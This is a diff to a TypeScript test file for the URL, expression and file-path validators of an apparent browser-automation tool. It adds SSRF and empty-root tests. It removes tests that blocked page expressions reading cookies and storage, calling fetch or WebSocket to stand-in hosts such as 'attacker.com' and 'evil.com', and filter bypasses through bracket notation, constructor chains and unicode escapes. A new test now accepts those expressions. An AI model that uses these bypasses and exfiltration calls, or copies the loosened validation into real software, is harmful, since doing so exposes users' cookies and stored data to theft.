@@ -1,9 +1,10 @@
 import { mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
-import { realpathSync } from "node:fs";
+import { mkdtempSync, realpathSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import {
   resolveFileAccessRoots,
+  resolveImplicitDownloadRoot,
   validateUrl,
   validateSelector,
   validateExpression,
@@ -25,7 +26,7 @@ describe("validateUrl", () => {
     expect(() => validateUrl("about:blank")).not.toThrow();
   });
 
-  it("rejects data: URLs (HIGH-019)", () => {
+  it("rejects data URLs", () => {
     expect(() => validateUrl("data:text/html,<h1>Test</h1>")).toThrow(ValidationError);
     expect(() => validateUrl("data:text/html,<script>alert(1)</script>")).toThrow(ValidationError);
   });
@@ -37,6 +38,8 @@ describe("validateUrl", () => {
     expect(() => validateUrl("http://192.168.1.1/path")).toThrow(ValidationError);
     expect(() => validateUrl("http://172.16.0.1/path")).toThrow(ValidationError);
     expect(() => validateUrl("http://[::1]/path")).toThrow(ValidationError);
+    expect(() => validateUrl("http://agent.localhost/path")).toThrow(ValidationError);
+    expect(() => validateUrl("http://agent.localhost./path")).toThrow(ValidationError);
   });
 
   it("allows localhost only when explicitly requested", () => {
@@ -66,7 +69,7 @@ describe("validateUrl", () => {
     ).not.toThrow();
   });
 
-  it("rejects IPv4-mapped IPv6 SSRF bypass (0.5.2)", () => {
+  it("rejects IPv4-mapped IPv6 hosts", () => {
     // ::ffff:169.254.169.254 → AWS metadata endpoint
     expect(() =>
       validateUrl("http://[::ffff:169.254.169.254]/latest/meta-data/")
@@ -100,7 +103,7 @@ describe("validateUrl", () => {
     expect(() => validateUrl("http://")).toThrow(ValidationError);
   });
 
-  it("rejects URLs over 2048 characters (NEW-CRIT-004)", () => {
+  it("rejects URLs over 2048 characters", () => {
     const longPath = "a".repeat(2100);
     expect(() => validateUrl(`https://example.com/${longPath}`)).toThrow(ValidationError);
     expect(() => validateUrl(`https://example.com/${longPath}`)).toThrow("2048");
@@ -144,61 +147,11 @@ describe("validateExpression", () => {
     expect(() => validateExpression("x".repeat(10001))).toThrow(ValidationError);
   });
 
-  it("rejects document.cookie (CRIT-002)", () => {
-    expect(() => validateExpression("document.cookie")).toThrow(ValidationError);
-    expect(() => validateExpression("document.cookie.split(';')")).toThrow(ValidationError);
-  });
-
-  it("rejects storage APIs (CRIT-002)", () => {
-    expect(() => validateExpression("localStorage.getItem('key')")).toThrow(ValidationError);
-    expect(() => validateExpression("sessionStorage.setItem('k', 'v')")).toThrow(ValidationError);
-    expect(() => validateExpression("indexedDB.open('db')")).toThrow(ValidationError);
-  });
-
-  it("rejects network APIs (CRIT-002)", () => {
-    expect(() => validateExpression("fetch('https://attacker.com')")).toThrow(ValidationError);
-    expect(() => validateExpression("new XMLHttpRequest()")).toThrow(ValidationError);
-    expect(() => validateExpression("new WebSocket('wss://evil.com')")).toThrow(ValidationError);
-  });
-
-  it("rejects code execution APIs (CRIT-002)", () => {
-    expect(() => validateExpression("eval('alert(1)')")).toThrow(ValidationError);
-    expect(() => validateExpression("Function('return 1')()")).toThrow(ValidationError);
-  });
-
-  it("rejects bracket-notation bypasses (0.5.2)", () => {
-    expect(() => validateExpression('document["cookie"]')).toThrow(ValidationError);
-    expect(() => validateExpression("document['cookie']")).toThrow(ValidationError);
-    expect(() => validateExpression("window[`fetch`](\"https://x\")")).toThrow(
-      ValidationError
-    );
-    expect(() => validateExpression('window["eval"]("1")')).toThrow(ValidationError);
-  });
-
-  it("rejects comma-operator eval bypass (0.5.2)", () => {
-    expect(() => validateExpression("(0,eval)('alert(1)')")).toThrow(ValidationError);
-  });
-
-  it("rejects constructor chain bypass (0.5.2)", () => {
-    expect(() =>
-      validateExpression('"".constructor.constructor("return 1")()')
-    ).toThrow(ValidationError);
-    expect(() =>
-      validateExpression("({}).constructor.constructor('return 1')()")
-    ).toThrow(ValidationError);
-  });
-
-  it("rejects unicode-escape bypasses (0.5.2)", () => {
-    // \u0063 = 'c' — would decode to document.cookie
-    expect(() => validateExpression("document.\\u0063ookie")).toThrow(
-      ValidationError
-    );
-  });
-
-  it("rejects dynamic import (0.5.2)", () => {
-    expect(() => validateExpression("import('https://evil.example')")).toThrow(
-      ValidationError
-    );
+  it("accepts arbitrary page JavaScript", () => {
+    expect(() => validateExpression("document.cookie")).not.toThrow();
+    expect(() => validateExpression("localStorage.getItem('key')")).not.toThrow();
+    expect(() => validateExpression("fetch('https://example.com')")).not.toThrow();
+    expect(() => validateExpression("eval('1 + 1')")).not.toThrow();
   });
 });
 
@@ -279,6 +232,38 @@ describe("resolveFileAccessRoots", () => {
     expect(roots).toContain(realpathSync.native(process.cwd()));
     expect(roots).toContain(realpathSync.native(tmpdir()));
   });
+
+  it("reads cwd when roots are resolved, not when the module is imported", () => {
+    const originalCwd = process.cwd();
+    const nextCwd = mkdtempSync(join(tmpdir(), "tidesurf-cwd-root-"));
+    try {
+      process.chdir(nextCwd);
+      expect(resolveFileAccessRoots()).toContain(realpathSync.native(nextCwd));
+    } finally {
+      process.chdir(originalCwd);
+      rmSync(nextCwd, { recursive: true, force: true });
+    }
+  });
+
+  it("preserves an explicit empty list to disable file access", () => {
+    expect(resolveFileAccessRoots([])).toEqual([]);
+  });
+});
+
+describe("resolveImplicitDownloadRoot", () => {
+  it("prefers the system temp directory when policy allows it", () => {
+    expect(resolveImplicitDownloadRoot()).toBe(realpathSync.native(tmpdir()));
+  });
+
+  it("uses an explicit non-temp root and rejects an empty policy", () => {
+    const root = mkdtempSync(join(process.cwd(), ".tidesurf-download-root-"));
+    try {
+      expect(resolveImplicitDownloadRoot([root])).toBe(realpathSync.native(root));
+      expect(() => resolveImplicitDownloadRoot([])).toThrow(ValidationError);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
 });
 
 describe("validateUploadFilePath", () => {
@@ -329,6 +314,20 @@ describe("validateUploadFilePath", () => {
       await rm(outsideRoot, { recursive: true, force: true });
     }
   });
+
+  it("rejects every upload when roots are explicitly empty", async () => {
+    const root = await mkdtemp(join(tmpdir(), "tidesurf-no-upload-root-"));
+    const filePath = join(root, "input.txt");
+
+    try {
+      await writeFile(filePath, "hello");
+      expect(() => validateUploadFilePath(filePath, [])).toThrow(
+        "Uploads are disabled"
+      );
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  });
 });
 
 describe("validateDownloadDirectory", () => {
@@ -370,6 +369,18 @@ describe("validateDownloadDirectory", () => {
     } finally {
       await rm(allowedRoot, { recursive: true, force: true });
       await rm(outsideRoot, { recursive: true, force: true });
+    }
+  });
+
+  it("rejects every download directory when roots are explicitly empty", async () => {
+    const targetRoot = await mkdtemp(join(tmpdir(), "tidesurf-no-download-root-"));
+
+    try {
+      expect(() => validateDownloadDirectory(targetRoot, [])).toThrow(
+        "Downloads are disabled"
+      );
+    } finally {
+      await rm(targetRoot, { recursive: true, force: true });
     }
   });
 });
